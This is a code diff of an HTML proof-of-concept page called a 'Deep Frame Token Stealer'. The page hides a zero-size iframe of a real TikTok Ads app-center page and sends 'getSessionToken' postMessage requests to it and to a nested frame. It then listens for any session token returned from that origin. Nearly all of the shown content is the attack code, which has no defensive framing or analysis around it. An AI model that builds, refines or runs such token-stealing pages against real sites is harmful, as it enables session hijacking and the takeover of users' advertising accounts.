@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Token Stealer PoC</title>
+    <title>Deep Frame Token Stealer</title>
 </head>
 <body>
     <iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>
@@ -10,14 +10,30 @@
     <script>
         window.addEventListener('DOMContentLoaded', () => {
             const iframe = document.getElementById('victim');
+
             iframe.onload = function () {
-                iframe.contentWindow.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
+                const outerFrame = iframe.contentWindow;
+
+                // Try outer frame first
+                outerFrame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
+
+                // Try nested frames inside the iframe
+                setTimeout(() => {
+                    try {
+                        const innerFrame = outerFrame.frames[0]; // First nested frame
+                        if (innerFrame) {
+                            innerFrame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
+                        }
+                    } catch (e) {
+                        console.error('Could not access nested frame:', e);
+                    }
+                }, 1000); // Give it some time to fully load nested frames
             };
 
+            // Capture any token coming back from any frame
             window.addEventListener('message', (e) => {
                 if (e.origin === 'https://ads.tiktok.com') {
-                    console.log('Token received from target:', e.data);
-                    // Send it to your server or display it
+                    console.log('Token received from nested frame:', e.data);
                 }
             });
         });
